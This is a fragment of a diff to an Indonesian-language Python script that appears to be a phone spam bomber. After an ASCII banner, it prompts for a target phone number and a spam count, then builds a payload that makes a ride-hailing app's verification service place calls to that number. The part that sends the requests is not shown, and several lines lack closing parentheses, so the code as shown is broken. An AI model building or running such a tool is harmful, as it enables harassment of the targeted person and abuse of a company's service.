@@ -27,7 +27,6 @@ print("""
 \| |._.| |/-’
  '"'   '"'
 <NOTE> Github : https://github.com/Henrycko"""
-print("[*] Klik ENTER Untuk Skip!"
 no1 = input("[?] Nomor Target =>"
 jlmh=int(input("%s[?] Jumlah spam =>"
 dt={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
